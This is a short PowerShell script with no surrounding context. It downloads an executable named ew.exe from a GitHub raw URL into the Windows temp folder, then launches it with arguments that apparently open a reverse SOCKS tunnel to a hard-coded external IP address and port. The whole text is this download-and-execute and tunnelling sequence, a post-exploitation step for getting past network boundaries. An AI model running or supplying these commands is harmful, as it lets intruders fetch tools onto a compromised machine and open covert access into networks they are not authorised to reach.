$client = new-object System.Net.WebClient
$client.DownloadFile('https://raw.githubusercontent.com/wuxin1996/download/master/ew.exe', 'C:\windows\temp\ew.exe')
Start-Process -FilePath c:\\windows\\temp\\ew.exe  -ArgumentList "-s rssocks -d 116.252.173.100 -e 31081" -NoNewWindow
